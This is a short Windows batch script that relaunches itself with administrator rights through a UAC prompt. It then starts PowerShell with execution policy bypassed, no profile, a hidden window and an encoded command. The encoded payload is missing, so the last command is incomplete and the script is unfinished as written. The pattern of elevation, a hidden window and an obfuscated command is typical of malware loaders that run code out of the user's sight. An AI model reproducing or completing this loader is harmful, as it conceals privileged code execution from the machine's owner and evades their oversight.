@echo off
:: Auto-elevate to Administrator (triggers UAC prompt)
net session >nul 2>&1
if %errorlevel% neq 0 (
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

:: If we get here, we're running as Administrator
powershell -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -EncodedCommand 
exit